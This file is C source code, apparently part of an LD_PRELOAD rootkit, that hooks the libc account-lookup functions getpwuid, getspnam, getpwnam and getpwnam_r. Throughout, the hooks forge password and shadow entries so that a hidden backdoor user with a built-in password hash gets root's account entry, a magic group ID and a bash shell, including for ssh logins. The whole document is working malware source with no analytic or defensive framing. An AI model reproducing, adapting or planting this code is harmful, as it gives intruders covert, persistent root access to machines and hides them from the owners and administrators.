struct passwd *getpwuid(uid_t uid) {
  struct passwd *forged_passwd;
  char *procname = get_my_procname();
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_getpwuid) old_getpwuid= dlsym (libc, "getpwuid");
  if(uid == MAGIC_GID) return old_getpwuid(0);
  if (getgid() == MAGIC_GID && uid == 0 && (!strcmp(procname, "ssh") || !strcmp(procname,"/usr/bin/ssh"))) {
    forged_passwd = old_getpwuid(uid);
    forged_passwd->pw_uid = MAGIC_GID;
    forged_passwd->pw_gid = MAGIC_GID;
    forged_passwd->pw_dir = HOMEDIR;
    forged_passwd->pw_shell = "/bin/bash";
    return forged_passwd;
  }
  return old_getpwuid(uid);
}
struct spwd *getspnam(const char *name) {
  struct spwd *forged_spwd = malloc(sizeof(struct spwd));
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_getspnam) old_getspnam = dlsym(RTLD_NEXT,"getspnam");
  if(!strcmp(name,BD_USER)) {
    forged_spwd->sp_namp = BD_USER;
    forged_spwd->sp_pwdp = BD_CRYPT_PASS;
    forged_spwd->sp_lstchg = time(NULL)/(60*60*24);
    forged_spwd->sp_expire = time(NULL)/(60*60*24) +90; // fuck you it expires in 3 months
    forged_spwd->sp_inact = 9001; // because never expire
    forged_spwd->sp_warn = 0;
    forged_spwd->sp_min = 0;
    forged_spwd->sp_max = 99999;
    return forged_spwd;
  }
  return old_getspnam(name);
}

struct passwd *getpwnam(const char *name) {
  struct passwd *forged_passwd;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_getpwnam) old_getpwnam = dlsym (libc, "getpwnam");
  if(!strcmp(name,BD_USER)) {
    forged_passwd = old_getpwnam("root");
    forged_passwd->pw_name = BD_USER;
    forged_passwd->pw_uid = MAGIC_GID;
    forged_passwd->pw_gid = MAGIC_GID;
    forged_passwd->pw_dir = HOMEDIR;
    forged_passwd->pw_shell = "/bin/bash";
    return forged_passwd;
  }
  return old_getpwnam(name);
}
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) {
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_getpwnam_r) old_getpwnam_r = dlsym (libc, "getpwnam_r");
  if(!strcmp(name,BD_USER)) {
      old_getpwnam_r("root",pwd,buf,buflen,result);
      pwd->pw_name = BD_USER;
      pwd->pw_uid = MAGIC_GID;
      pwd->pw_gid = MAGIC_GID;
      pwd->pw_dir = HOMEDIR;
      pwd->pw_shell = "/bin/bash";
      return 0;
  }
  return old_getpwnam_r(name,pwd,buf,buflen,result);
}




